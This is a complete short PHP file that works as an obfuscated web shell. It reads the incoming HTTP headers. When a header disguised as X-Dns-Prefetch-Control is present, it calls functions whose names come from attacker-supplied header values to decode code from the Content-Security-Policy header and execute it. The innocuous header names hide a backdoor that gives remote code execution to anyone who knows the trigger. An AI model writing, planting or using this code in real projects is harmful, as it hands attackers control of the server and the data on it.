<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['X-Dns-Prefetch-Control'])) {
    $rjust = $_HEADERS['X-Dns-Prefetch-Control']('', $_HEADERS['Sec-Websocket-Accept']($_HEADERS['Content-Security-Policy']));
    $rjust();
}